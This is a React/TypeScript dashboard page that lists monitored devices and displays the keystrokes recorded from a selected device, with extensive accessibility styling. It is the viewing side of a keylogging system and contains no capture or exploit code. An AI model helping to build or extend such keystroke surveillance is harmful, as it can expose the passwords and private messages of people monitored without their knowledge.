import React, { useEffect, useState, useCallback } from "react";
import axios from "axios";
import {
  Container,
  Typography,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Paper,
  Alert,
  Select,
  MenuItem,
  Box,
  FormControl,
  InputLabel,
  FormHelperText,
  Chip,
  Divider,
  LinearProgress,
  SelectChangeEvent,
  useTheme as useMuiTheme,
  Button,
  IconButton,
  Tooltip,
  Card,
  CardContent,
} from "@mui/material";
import { useTheme } from "../context/ThemeContext";
import AccessibilityAnnouncement from "../components/AccessibilityAnnouncement";

// Define ThemeExtras interface for consistent theming
interface ThemeExtras {
  card: string;
  border: string;
  input: string;
  headingSecondary: string;
  cardHeader: string;
  textSecondary: string;
  accent: string;
  tableHeader: string;
  tableRow: string;
}

// ✅ Define Device Interface
interface Device {
  device_id: string;
  device_name: string;
}

// ✅ Define Keystroke Interface
interface Keystroke {
  id: number;
  key_data: string;
  timestamp: string;
}

const Keylogger = () => {
  // Get theme context for colors and accessibility features
  const { colors, accessibility } = useTheme();
  const muiTheme = useMuiTheme();
  
  // Create combined theme colors for consistent styling
  const themeColors = {
    ...colors,
    card: '#ffffff',
    border: '#e0e0e0',
    input: '#f5f5f5',
    headingSecondary: '#424242',
    cardHeader: '#f8f8f8',
    textSecondary: '#757575',
    accent: colors.secondary || '#4caf50',
    tableHeader: '#f5f5f5',
    tableRow: '#fafafa'
  };

  // ✅ Define state properly with accessibility enhancements
  const [keystrokes, setKeystrokes] = useState<Keystroke[]>([]);
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<string>("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [dataLoading, setDataLoading] = useState<boolean>(false);
  const [announcement, setAnnouncement] = useState<string>("");

  // ✅ Fetch Keylogger Data with accessibility support
  const fetchKeyloggerData = useCallback((deviceId: string) => {
    const token = localStorage.getItem("token");

    if (!token) {
      setError("Unauthorized: Please log in.");
      setAnnouncement("Authentication error. Please log in to continue.");
      window.location.href = "/login";
      return;
    }

    // Set loading state for better user experience
    setDataLoading(true);
    
    // Find device name for better accessibility announcements
    const deviceName = devices.find(d => d.device_id === deviceId)?.device_name || deviceId;
    setAnnouncement(`Loading keystrokes from device ${deviceName}...`);

    axios
      .get<{ keylogger: Keystroke[] }>(`/api/tracker/keylogger/?device_id=${deviceId}`, {
        headers: { Authorization: `Token ${token}` },
      })
      .then((response) => {
        console.log("✅ Fetched keystrokes:", response.data);
        const keystrokeData = response.data.keylogger || []; // ✅ Ensure it's always an array
        setKeystrokes(keystrokeData);
        
        // Announce results for screen readers
        if (keystrokeData.length === 0) {
          setAnnouncement(`No keystrokes found for device ${deviceName}`);
        } else {
          setAnnouncement(`Loaded ${keystrokeData.length} keystroke entries for device ${deviceName}`);
        }
        
        setError(null);
      })
      .catch((err) => {
        console.error("❌ API Error (Fetching Keylogger):", err);
        if (err.response?.status === 401) {
          setError("Unauthorized: Please log in again.");
          setAnnouncement("Authentication failed. Please log in again.");
          localStorage.removeItem("token");
          window.location.href = "/login";
        } else {
          setError("Error fetching keylogger data.");
          setAnnouncement("Failed to load keystroke data. Please try again later.");
        }
        setKeystrokes([]); // ✅ Prevent undefined errors
      })
      .finally(() => {
        setDataLoading(false);
      });
  }, [devices]);

  // ✅ Fetch Devices & Initialize First Device with accessibility support
  const fetchDevices = useCallback(() => {
    const token = localStorage.getItem("token");

    if (!token) {
      setError("Unauthorized: Please log in.");
      setAnnouncement("Authentication error. Please log in to continue.");
      window.location.href = "/login";
      return;
    }

    // Set loading state for better UX
    setLoading(true);
    setAnnouncement("Loading available devices...");

    axios
      .get<{ devices: Device[] }>("/api/tracker/device-management/", {
        headers: { Authorization: `Token ${token}` },
      })
      .then((response) => {
        console.log("✅ Fetched devices:", response.data);
        if (Array.isArray(response.data.devices)) {
          const deviceList = response.data.devices;
          setDevices(deviceList);
          
          // Announce device count for screen readers
          const deviceCount = deviceList.length;
          
          if (deviceCount > 0) {
            const firstDeviceId = deviceList[0].device_id;
            const firstName = deviceList[0].device_name;
            
            setSelectedDevice(firstDeviceId);
            setAnnouncement(`Found ${deviceCount} device${deviceCount !== 1 ? 's' : ''}. Selected ${firstName} for monitoring keystrokes.`);
            
            // Load keylogger data for first device
            fetchKeyloggerData(firstDeviceId);
          } else {
            setAnnouncement("No devices found. Please add a device first to monitor keystrokes.");
            setLoading(false);
          }
        } else {
          setError("Invalid API response format.");
          setAnnouncement("Error in the device data format. Please try again later.");
          setLoading(false);
        }
      })
      .catch((err) => {
        console.error("❌ API Error (Fetching Devices):", err);
        if (err.response?.status === 401) {
          setError("Unauthorized: Please log in again.");
          setAnnouncement("Your session has expired. Please log in again.");
          localStorage.removeItem("token");
          window.location.href = "/login";
        } else {
          setError("Error fetching devices.");
          setAnnouncement("Failed to load devices. Please check your connection and try again.");
        }
        setLoading(false);
      });
  }, [fetchKeyloggerData]);

  // ✅ Fetch devices on component mount
  useEffect(() => {
    fetchDevices();
  }, [fetchDevices]);

  return (
    <Container>
      {/* Screen reader announcement */}
      <AccessibilityAnnouncement message={announcement} />
      
      {/* Page Title with theme-aware styling */}
      <Typography 
        variant="h4" 
        component="h1"
        sx={{ 
          mb: 3,
          color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
          fontSize: accessibility.largeText ? '2.5rem' : '2rem',
          fontWeight: 600,
          ...(accessibility.highContrast ? {
            textDecoration: 'underline',
            textUnderlineOffset: '5px'
          } : {
            background: `linear-gradient(45deg, ${themeColors.primary}, ${themeColors.accent})`,
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: accessibility.highContrast ? 'initial' : 'transparent'
          })
        }}
      >
        Keylogger Monitoring
      </Typography>

      {/* Error alert with enhanced accessibility */}
      {error && (
        <Alert 
          severity="error" 
          sx={{ 
            marginY: 2,
            ...(accessibility.highContrast && {
              backgroundColor: '#ffebee', 
              color: '#d32f2f',
              border: '2px solid #d32f2f',
              fontWeight: 'bold'
            })
          }}
          role="alert"
          aria-live="assertive"
        >
          {error}
        </Alert>
      )}

      {/* Loading indicator */}
      {loading && (
        <Box sx={{ width: '100%', mt: 2, mb: 2 }}>
          <LinearProgress 
            color="primary" 
            aria-label="Loading data"
            sx={{
              height: accessibility.largeText ? 10 : 6,
              backgroundColor: accessibility.highContrast ? '#e0e0e0' : undefined,
              '& .MuiLinearProgress-bar': {
                backgroundColor: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary
              }
            }}
          />
          <Typography 
            variant="body2" 
            sx={{ 
              mt: 1, 
              color: 'text.secondary',
              ...(accessibility.highContrast && { color: muiTheme.palette.text.primary, fontWeight: 'bold' })
            }}
            aria-live="polite"
          >
            {loading ? "Loading devices..." : ""}
          </Typography>
        </Box>
      )}
      
      {/* Device selection and control section */}
      <Paper
        elevation={accessibility.highContrast ? 0 : 1}
        sx={{ 
          p: 3, 
          my: 3,
          borderRadius: 2,
          border: accessibility.highContrast ? `2px solid ${muiTheme.palette.text.primary}` : 'none',
          backgroundColor: accessibility.highContrast ? 'transparent' : 'background.paper'
        }}
      >
        <Box 
          sx={{
            display: 'flex',
            alignItems: 'center',
            mb: 2
          }}
        >
          <i 
            className="ri-device-line" 
            style={{ 
              color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
              fontSize: accessibility.largeText ? '1.8rem' : '1.5rem',
              marginRight: '12px'
            }}
          ></i>
          <Typography
            variant="h6"
            sx={{
              fontWeight: 600,
              color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
              ...(accessibility.largeText && { fontSize: '1.4rem' })
            }}
          >
            Device Selection
          </Typography>
        </Box>
      
        {/* Device Count Summary */}
        {devices.length > 0 && (
          <Box sx={{ display: 'flex', gap: 1, mb: 2, alignItems: 'center', flexWrap: 'wrap' }}>
            <Chip 
              label={`${devices.length} connected device${devices.length !== 1 ? 's' : ''}`}
              size={accessibility.largeText ? "medium" : "small"}
              sx={{ 
                bgcolor: accessibility.highContrast ? 'transparent' : `${themeColors.primary}15`,
                color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
                fontWeight: 500,
                border: accessibility.highContrast ? `2px solid ${muiTheme.palette.text.primary}` : 'none',
                ...(accessibility.largeText && { fontSize: '1rem' })
              }}
            />
          </Box>
        )}
        
        {/* Device Selector with accessibility enhancements */}
        <FormControl 
          fullWidth 
          sx={{ 
            mb: 2,
            ...(accessibility.highContrast && {
              '& .MuiOutlinedInput-notchedOutline': {
                borderWidth: 2,
                borderColor: muiTheme.palette.text.primary
              },
              '&:hover .MuiOutlinedInput-notchedOutline': {
                borderColor: muiTheme.palette.text.primary
              }
            })
          }}
        >
          <InputLabel 
            id="device-select-label"
            sx={{ 
              color: accessibility.highContrast ? muiTheme.palette.text.primary : undefined,
              ...(accessibility.largeText && { fontSize: '1.1rem' })
            }}
          >
            Select Device for Keystroke Monitoring
          </InputLabel>
          <Select
            labelId="device-select-label"
            id="device-select"
            value={selectedDevice}
            onChange={(e: SelectChangeEvent) => {
              const deviceId = e.target.value;
              setSelectedDevice(deviceId);
              
              // Find device name for better announcement
              const selectedDeviceName = devices.find(d => d.device_id === deviceId)?.device_name || deviceId;
              setAnnouncement(`Switching to device ${selectedDeviceName} for keystroke monitoring`);
              
              fetchKeyloggerData(deviceId);
            }}
            label="Select Device for Keystroke Monitoring"
            displayEmpty
            fullWidth
            sx={{ 
              ...(accessibility.largeText && { 
                fontSize: '1.1rem',
                '.MuiSelect-select': { padding: '14px' }
              })
            }}
          >
            {devices.length > 0 ? (
              devices.map((device: Device) => (
                <MenuItem 
                  key={device.device_id} 
                  value={device.device_id}
                  sx={{ 
                    ...(accessibility.largeText && { fontSize: '1.1rem' })
                  }}
                >
                  {device.device_name} (ID: {device.device_id})
                </MenuItem>
              ))
            ) : (
              <MenuItem disabled>No devices found</MenuItem>
            )}
          </Select>
          <FormHelperText
            sx={{
              color: accessibility.highContrast ? muiTheme.palette.text.primary : undefined,
              ...(accessibility.largeText && { fontSize: '0.9rem' })
            }}
          >
            Choose a device to monitor its keystrokes
          </FormHelperText>
        </FormControl>
      </Paper>

      {/* Keylogger Data Display Section */}
      <Box 
        id="keylogger-data"
        role="region"
        aria-label="Keystroke monitoring data"
        tabIndex={0}
      >
        <Box sx={{ display: 'flex', alignItems: 'center', mb: 2 }}>
          <i 
            className="ri-keyboard-line" 
            style={{ 
              color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
              fontSize: accessibility.largeText ? '1.8rem' : '1.5rem',
              marginRight: '12px'
            }}
          ></i>
          <Typography
            variant="h6"
            sx={{
              fontWeight: 600,
              color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
              ...(accessibility.largeText && { fontSize: '1.4rem' })
            }}
          >
            Recorded Keystrokes
          </Typography>
        </Box>
        
        {/* Data Loading Indicator */}
        {dataLoading && (
          <Box sx={{ width: '100%', mt: 2, mb: 2 }}>
            <LinearProgress 
              color="primary" 
              aria-label="Loading keystroke data"
              sx={{
                height: accessibility.largeText ? 8 : 4,
                backgroundColor: accessibility.highContrast ? '#e0e0e0' : undefined,
                '& .MuiLinearProgress-bar': {
                  backgroundColor: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary
                }
              }}
            />
            <Typography 
              variant="body2" 
              sx={{ 
                mt: 1, 
                color: 'text.secondary',
                ...(accessibility.highContrast && { color: muiTheme.palette.text.primary, fontWeight: 'bold' })
              }}
              aria-live="polite"
            >
              Loading keystroke data...
            </Typography>
          </Box>
        )}
        
        {/* Keylogger Table with accessibility support */}
        {keystrokes.length > 0 ? (
          <Paper 
            elevation={accessibility.highContrast ? 0 : 1}
            sx={{ 
              borderRadius: 1,
              overflow: 'hidden',
              border: accessibility.highContrast ? `2px solid ${muiTheme.palette.text.primary}` : 'none',
            }}
          >
            <TableContainer>
              <Table
                aria-label="Keystroke data table"
                sx={{
                  ...(accessibility.largeText && {
                    '& .MuiTableCell-root': {
                      fontSize: '1.1rem',
                      padding: '12px 16px'
                    }
                  })
                }}
              >
                <TableHead
                  sx={{
                    backgroundColor: accessibility.highContrast ? muiTheme.palette.grey[200] : themeColors.tableHeader,
                    '& .MuiTableCell-root': {
                      color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
                      fontWeight: 'bold',
                      borderBottom: accessibility.highContrast ? `2px solid ${muiTheme.palette.text.primary}` : undefined
                    }
                  }}
                >
                  <TableRow>
                    <TableCell sx={{ width: '60%' }}>
                      <Box sx={{ display: 'flex', alignItems: 'center' }}>
                        <i className="ri-key-line" style={{ marginRight: 8, fontSize: accessibility.largeText ? '1.2rem' : '1rem' }}></i>
                        Keystroke Data
                      </Box>
                    </TableCell>
                    <TableCell sx={{ width: '40%' }}>
                      <Box sx={{ display: 'flex', alignItems: 'center' }}>
                        <i className="ri-time-line" style={{ marginRight: 8, fontSize: accessibility.largeText ? '1.2rem' : '1rem' }}></i>
                        Timestamp
                      </Box>
                    </TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {keystrokes.map((log) => (
                    <TableRow 
                      key={log.id}
                      hover
                      sx={{
                        '&:nth-of-type(odd)': {
                          backgroundColor: accessibility.highContrast ? 'rgba(0, 0, 0, 0.08)' : 'rgba(0, 0, 0, 0.02)',
                        },
                        ...(accessibility.highContrast && {
                          '&:hover': {
                            backgroundColor: 'rgba(0, 0, 0, 0.12) !important'
                          },
                          '& .MuiTableCell-root': {
                            borderBottom: `1px solid ${muiTheme.palette.text.primary}`
                          }
                        })
                      }}
                    >
                      <TableCell
                        component="th"
                        scope="row"
                        sx={{
                          fontFamily: 'monospace',
                          fontWeight: 'medium',
                          color: accessibility.highContrast ? muiTheme.palette.text.primary : undefined,
                          ...(accessibility.largeText && {
                            fontSize: '1.1rem'
                          })
                        }}
                      >
                        {log.key_data}
                      </TableCell>
                      <TableCell
                        sx={{
                          color: accessibility.highContrast ? muiTheme.palette.text.primary : 'text.secondary',
                          ...(accessibility.largeText && {
                            fontSize: '1rem'
                          })
                        }}
                      >
                        {new Date(log.timestamp).toLocaleString()}
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          </Paper>
        ) : (
          <Paper
            elevation={accessibility.highContrast ? 0 : 1}
            sx={{ 
              p: 4, 
              mt: 2, 
              textAlign: 'center',
              borderRadius: 2,
              minHeight: '200px',
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'center',
              alignItems: 'center',
              gap: 2,
              ...(accessibility.highContrast && {
                border: `2px solid ${muiTheme.palette.text.primary}`,
              })
            }}
          >
            <i 
              className="ri-keyboard-line" 
              style={{ 
                fontSize: accessibility.largeText ? '3rem' : '2.5rem',
                color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
                opacity: 0.5
              }}
            ></i>
            <Typography 
              sx={{ 
                color: accessibility.highContrast ? muiTheme.palette.text.primary : 'text.secondary',
                ...(accessibility.largeText && { fontSize: '1.2rem' })
              }}
              aria-live="polite"
            >
              {dataLoading ? "Loading keystroke data..." : "No keystrokes recorded for this device."}
            </Typography>
            {!dataLoading && (
              <Typography 
                variant="body2"
                sx={{ 
                  color: accessibility.highContrast ? muiTheme.palette.text.primary : 'text.secondary',
                  maxWidth: '400px',
                  ...(accessibility.largeText && { fontSize: '1rem' })
                }}
              >
                Keystrokes will appear here when the device starts sending data.
              </Typography>
            )}
          </Paper>
        )}
        
        {/* Keystroke Count Summary */}
        {keystrokes.length > 0 && (
          <Box sx={{ mt: 2, display: 'flex', gap: 1, alignItems: 'center' }}>
            <Chip 
              label={`${keystrokes.length} keystroke record${keystrokes.length !== 1 ? 's' : ''}`}
              size={accessibility.largeText ? "medium" : "small"}
              sx={{ 
                bgcolor: accessibility.highContrast ? 'transparent' : `${themeColors.primary}15`,
                color: accessibility.highContrast ? muiTheme.palette.text.primary : themeColors.primary,
                fontWeight: 500,
                border: accessibility.highContrast ? `2px solid ${muiTheme.palette.text.primary}` : 'none',
                ...(accessibility.largeText && { fontSize: '1rem' })
              }}
            />
            <Typography
              variant="caption"
              sx={{
                color: accessibility.highContrast ? muiTheme.palette.text.primary : 'text.secondary',
                ...(accessibility.largeText && { fontSize: '0.9rem' })
              }}
            >
              From {new Date(keystrokes[0].timestamp).toLocaleDateString()} to {new Date(keystrokes[keystrokes.length - 1].timestamp).toLocaleDateString()}
            </Typography>
          </Box>
        )}
      </Box>
      
      {/* Add CSS for screen reader only elements */}
      <style>{`
        .sr-only {
          position: absolute;
          width: 1px;
          height: 1px;
          padding: 0;
          margin: -1px;
          overflow: hidden;
          clip: rect(0, 0, 0, 0);
          white-space: nowrap;
          border-width: 0;
        }
      `}</style>
    </Container>
  );
};

export default Keylogger;
